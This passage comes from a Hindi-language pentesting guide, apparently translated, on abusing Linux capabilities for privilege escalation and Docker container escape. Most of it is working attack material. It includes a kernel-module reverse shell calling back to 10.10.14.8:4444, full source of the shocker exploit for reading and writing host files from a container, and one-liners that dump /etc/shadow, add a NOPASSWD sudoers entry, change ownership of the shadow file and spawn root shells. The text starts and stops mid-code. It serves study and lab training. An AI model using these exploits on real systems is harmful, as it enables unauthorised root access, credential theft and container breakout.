cp reverse-shell.ko lib/modules/$(uname -r)/
```
अंत में, इस kernel module को load करने के लिए आवश्यक python code execute करें:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binary के साथ उदाहरण 2**

निम्नलिखित उदाहरण में binary **`kmod`** में यह capability है।
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
जिसका अर्थ है कि इस privilege का दुरुपयोग करके kernel module insert करने के लिए **`insmod`** command का उपयोग करना संभव है। इस privilege का दुरुपयोग करके **reverse shell** प्राप्त करने के लिए नीचे दिए गए example का पालन करें।

**Example with environment (Docker breakout)**

आप Docker container के अंदर enabled capabilities को इस command का उपयोग करके check कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पहले के output में आप देख सकते हैं कि **SYS_MODULE** capability enabled है।

एक ऐसा **kernel module** **बनाएँ** जो reverse shell execute करेगा, और उसे **compile** करने के लिए **Makefile** बनाएँ:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile में प्रत्येक make word से पहले का खाली वर्ण **tab होना चाहिए, spaces नहीं**!

इसे compile करने के लिए `make` चलाएँ।
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
अंत में, एक shell के अंदर `nc` शुरू करें और दूसरे shell से **module load करें**, तब आप `nc` process में shell capture कर लेंगे:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**इस technique का code "Abusing SYS_MODULE Capability" की laboratory से copy किया गया था, जो** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

इस technique का एक अन्य example [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) में पाया जा सकता है।

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) किसी process को **files को read करने और directories को read तथा execute करने के लिए permissions को bypass करने** में सक्षम बनाता है। इसका primary use file searching या reading purposes के लिए है। हालांकि, यह किसी process को `open_by_handle_at(2)` function का उपयोग करने की अनुमति भी देता है, जो किसी भी file को access कर सकता है, जिसमें process के mount namespace के बाहर मौजूद files भी शामिल हैं। `open_by_handle_at(2)` में उपयोग किया जाने वाला handle एक non-transparent identifier होना चाहिए, जो `name_to_handle_at(2)` के माध्यम से प्राप्त किया गया हो, लेकिन इसमें inode numbers जैसी sensitive information शामिल हो सकती है, जो tampering के प्रति vulnerable होती है। इस capability के exploitation की संभावना, विशेष रूप से Docker containers के context में, Sebastian Krahmer द्वारा shocker exploit के माध्यम से प्रदर्शित की गई थी, जिसका analysis [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) किया गया है।
**इसका अर्थ है कि आप** **file read permission checks और directory read/execute permission checks को bypass कर सकते हैं।**

**binary के साथ Example**

binary किसी भी file को read कर सकेगा। इसलिए, यदि tar जैसी file में यह capability है, तो वह shadow file को read कर सकेगा:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 के साथ उदाहरण**

इस मामले में मान लेते हैं कि **`python`** binary में यह capability है। root files को list करने के लिए आप यह कर सकते हैं:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
और किसी फ़ाइल को पढ़ने के लिए आप यह कर सकते हैं:
```python
print(open("/etc/shadow", "r").read())
```
**Environment में Example (Docker breakout)**

आप docker container के अंदर enabled capabilities को इस तरह check कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले output में आप देख सकते हैं कि **DAC_READ_SEARCH** capability enabled है। इसके परिणामस्वरूप, container **debug processes** कर सकता है।

आप [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) में पढ़ सकते हैं कि निम्नलिखित exploiting कैसे काम करती है, लेकिन संक्षेप में, **CAP_DAC_READ_SEARCH** न केवल हमें permission checks के बिना file system में traverse करने की अनुमति देता है, बल्कि यह _**open_by_handle_at(2)**_ पर होने वाले सभी checks को भी explicitly हटा देता है और **हमारे process को अन्य processes द्वारा खोली गई sensitive files तक access की अनुमति दे सकता है**।

Host से files read करने के लिए इन permissions का abuse करने वाला original exploit यहां पाया जा सकता है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), निम्नलिखित इसका एक **modified version है, जो आपको पहले argument के रूप में read की जाने वाली file indicate करने और उसे किसी file में dump करने की अनुमति देता है।**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit को host पर mounted किसी चीज़ के pointer को ढूँढना होगा। Original exploit ने file /.dockerinit का उपयोग किया था और यह modified version /etc/hostname का उपयोग करता है। यदि exploit काम नहीं कर रहा है, तो शायद आपको कोई अलग file सेट करनी होगी। Host पर mounted file ढूँढने के लिए बस mount command execute करें:

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit को host पर mounted किसी चीज़ के pointer को ढूँढना होगा। Original exploit ने file /.dockerinit का उपयोग किया था और यह modified version...](<../../images/image (407) (1).png>)

**इस technique का code "Abusing DAC_READ_SEARCH Capability" की laboratory से copy किया गया है:** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**इसका मतलब है कि आप किसी भी file पर write permission checks को bypass कर सकते हैं, इसलिए आप कोई भी file write कर सकते हैं।**

ऐसी बहुत-सी files हैं जिन्हें आप **privileges escalate करने के लिए overwrite कर सकते हैं,** [**आप यहाँ से ideas प्राप्त कर सकते हैं**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)।

**Binary के साथ example**

इस example में vim के पास यह capability है, इसलिए आप _passwd_, _sudoers_ या _shadow_ जैसी किसी भी file को modify कर सकते हैं:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Binary 2 के साथ उदाहरण**

इस उदाहरण में **`python`** binary के पास यह capability होगी। आप किसी भी file को override करने के लिए python का उपयोग कर सकते हैं:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**environment + CAP_DAC_READ_SEARCH के साथ उदाहरण (Docker breakout)**

आप docker container के अंदर enabled capabilities को इस प्रकार check कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
सबसे पहले पिछले section को पढ़ें जो host की **arbitrary files पढ़ने के लिए DAC_READ_SEARCH capability का दुरुपयोग करता है** [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) और **exploit को compile करें**।\
फिर, **shocker exploit के निम्नलिखित version को compile करें**, जो आपको host के filesystem के अंदर **arbitrary files लिखने** की अनुमति देगा:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker container से **escape** करने के लिए आप host से `/etc/shadow` और `/etc/passwd` files को **download** कर सकते हैं, उनमें एक **new user** **add** कर सकते हैं, और उन्हें overwrite करने के लिए **`shocker_write`** का उपयोग कर सकते हैं। फिर, **ssh** के माध्यम से **access** कर सकते हैं।

**इस technique का code "Abusing DAC_OVERRIDE Capability" की laboratory से कॉपी किया गया था:** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**इसका अर्थ है कि किसी भी file का ownership बदलना संभव है।**

**binary के साथ Example**

मान लें कि **`python`** binary में यह capability है, तो आप **shadow** file का **owner** बदल सकते हैं, **root password** बदल सकते हैं, और privileges escalate कर सकते हैं:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
या **`ruby`** binary में यह capability होने पर:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**इसका मतलब है कि किसी भी file की permission बदलना संभव है।**

**binary के साथ Example**

यदि python के पास यह capability है, तो आप shadow file की permissions modify कर सकते हैं, **root password बदल सकते हैं**, और privileges escalate कर सकते हैं:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**इसका अर्थ है कि बनाए गए process की effective user id सेट करना संभव है।**

**binary के साथ Example**

यदि python में यह **capability** है, तो privileges को root तक escalate करने के लिए इसका बहुत आसानी से दुरुपयोग किया जा सकता है:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**एक और तरीका:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**इसका मतलब है कि बनाए गए process की effective group id सेट करना संभव है।**

ऐसी बहुत-सी files हैं जिन्हें आप **privileges escalate करने के लिए overwrite कर सकते हैं,** [**आप यहाँ से ideas प्राप्त कर सकते हैं**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)।

**binary के साथ उदाहरण**

इस मामले में आपको ऐसी interesting files ढूँढनी चाहिए जिन्हें कोई group read कर सके, क्योंकि आप किसी भी group का impersonate कर सकते हैं:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
एक बार आपको privileges escalate करने के लिए abuse की जा सकने वाली file (reading या writing के ज़रिए) मिल जाए, तो आप यह करके **interesting group का impersonation करने वाला shell प्राप्त कर सकते हैं**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
इस मामले में `shadow` समूह का प्रतिरूपण किया गया था, इसलिए आप फ़ाइल `/etc/shadow` पढ़ सकते हैं:
```bash
cat /etc/shadow
```
### संयुक्त chain: CAP_SETGID + CAP_CHOWN

जब दोनों capabilities एक ही helper में उपलब्ध हों, तो एक practical chain है:

1. EGID को `shadow` (या किसी अन्य privileged group) में switch करें।
2. `/etc/shadow` पर `chown` का उपयोग करके अपना UID सेट करें और group `shadow` बनाए रखें।
3. किसी target hash को पढ़ें और crack/pivot करें।
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
यह सीधे full root की आवश्यकता से बचाता है और credential reuse के माध्यम से pivot करने के लिए आमतौर पर पर्याप्त होता है।

यदि **docker** installed है, तो आप **docker group** का **impersonate** कर सकते हैं और इसका abuse करके [**docker socket** के साथ communicate करके privileges escalate कर सकते हैं](#writable-docker-socket)।

## CAP_SETFCAP

**इसका अर्थ है कि files और processes पर capabilities set करना संभव है**

**binary के साथ Example**

यदि python में यह **capability** है, तो आप इसका बहुत आसानी से abuse करके privileges को root तक escalate कर सकते हैं:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> ध्यान दें कि यदि आप CAP_SETFCAP के साथ binary में कोई नई capability सेट करते हैं, तो आप यह cap खो देंगे।

एक बार आपके पास [SETUID capability](linux-capabilities.md#cap_setuid) होने पर, privileges escalate करने का तरीका देखने के लिए इसके section पर जा सकते हैं।

**environment के साथ Example (Docker breakout)**

By default, **Docker में container के अंदर proccess को CAP_SETFCAP capability दी जाती है**। आप इस तरह का कुछ करके इसे check कर सकते हैं:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
यह capability **binaries को कोई भी अन्य capability देने की अनुमति देती है**, इसलिए हम इस page में बताए गए **अन्य capability breakouts का दुरुपयोग करके container से **escaping** करने के बारे में सोच सकते हैं।\
हालाँकि, यदि आप उदाहरण के लिए gdb binary को CAP_SYS_ADMIN और CAP_SYS_PTRACE capabilities देने का प्रयास करते हैं, तो आप पाएँगे कि आप उन्हें दे सकते हैं, लेकिन इसके बाद **binary execute नहीं हो पाएगी**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[docs से](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: यह **effective capabilities** का एक **limiting superset** है, जिसे thread अपना सकता है। यह उन capabilities का भी एक limiting superset है, जिन्हें ऐसा thread, जिसके **effective set** में **CAP_SETPCAP** capability **नहीं** है, **inheritable set** में जोड़ सकता है।_\
ऐसा लगता है कि Permitted capabilities उन capabilities को सीमित करती हैं, जिनका उपयोग किया जा सकता है।\
हालाँकि, Docker डिफ़ॉल्ट रूप से **CAP_SETPCAP** भी देता है, इसलिए संभव है कि आप **inheritable set में नई capabilities सेट कर सकें**।\
हालाँकि, इस cap के documentation में लिखा है: _CAP_SETPCAP : \[…] **calling thread के bounding set से किसी भी capability को उसके inheritable set में जोड़ें**।_\
ऐसा लगता है कि हम केवल bounding set से capabilities को inheritable set में जोड़ सकते हैं। इसका अर्थ है कि **हम privilege escalation के लिए CAP_SYS_ADMIN या CAP_SYS_PTRACE जैसी नई capabilities को inherit set में नहीं डाल सकते**।

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) कई sensitive operations प्रदान करता है, जिनमें `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक access, `mmap_min_addr` को modify करना, `ioperm(2)` और `iopl(2)` system calls तक access, और विभिन्न disk commands शामिल हैं। **यह capability** `FIBMAP ioctl(2)` को भी enable करती है, जिसके कारण [अतीत में](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) समस्याएँ उत्पन्न हुई हैं। man page के अनुसार, यह holder को descriptively `अन्य devices पर device-specific operations की एक range perform करने` की अनुमति भी देती है।

यह **privilege escalation** और **Docker breakout** के लिए उपयोगी हो सकता है।

## CAP_KILL

**इसका अर्थ है कि किसी भी process को kill करना संभव है।**

**binary के साथ Example**

मान लें कि **`python`** binary के पास यह capability है। यदि आप **किसी service या socket configuration** (या किसी service से संबंधित किसी भी configuration file) को **modify** भी कर सकते हैं, तो आप उसमें backdoor डाल सकते हैं, फिर उस service से संबंधित process को kill कर सकते हैं और नई configuration file के आपके backdoor के साथ execute होने की प्रतीक्षा कर सकते हैं।
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill के साथ Privesc**

यदि आपके पास kill capabilities हैं और कोई **node program running as root** (या किसी अलग user के रूप में) चल रहा है, तो आप संभवतः उसे **signal SIGUSR1** **send** कर सकते हैं, जिससे वह **node debugger** open कर दे और आप उससे connect कर सकें।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**इसका मतलब है कि किसी भी port (यहाँ तक कि privileged ports) पर listen करना संभव है।** आप इस capability के ज़रिए सीधे privileges escalate नहीं कर सकते।

**binary के साथ उदाहरण**

यदि **`python`** के पास यह capability है, तो वह किसी भी port पर listen कर सकेगा और वहाँ से किसी भी अन्य port से connect भी कर सकेगा (कुछ services के लिए specific privileged ports से connections आवश्यक होते हैं)।

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability processes को **RAW और PACKET sockets बनाने** की अनुमति देती है, जिससे वे मनमाने network packets generate और send कर सकते हैं। इससे containerized environments में security risks उत्पन्न हो सकते हैं, जैसे packet spoofing, traffic injection और network access controls को bypass करना। Malicious actors इसका exploit करके container routing में हस्तक्षेप कर सकते हैं या host network security को compromise कर सकते हैं, विशेष रूप से पर्याप्त firewall protections के बिना। इसके अतिरिक्त, **CAP_NET_RAW** privileged containers के लिए RAW ICMP requests के माध्यम से ping जैसे operations को support करने हेतु महत्वपूर्ण है।

**इसका अर्थ है कि traffic को sniff करना संभव है।** आप इस capability से सीधे privileges escalate नहीं कर सकते।

**binary के साथ उदाहरण**

यदि binary **`tcpdump`** में यह capability है, तो आप इसका उपयोग network information capture करने के लिए कर सकेंगे।
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
ध्यान दें कि यदि **environment** यह capability दे रहा है, तो आप traffic को sniff करने के लिए **`tcpdump`** का भी उपयोग कर सकते हैं।

**Example with binary 2**

निम्नलिखित उदाहरण **`python2`** code है, जो "**lo**" (**localhost**) interface के traffic को intercept करने के लिए उपयोगी हो सकता है। यह code [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) के lab "_The Basics: CAP-NET_BIND + NET_RAW_" से लिया गया है।
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
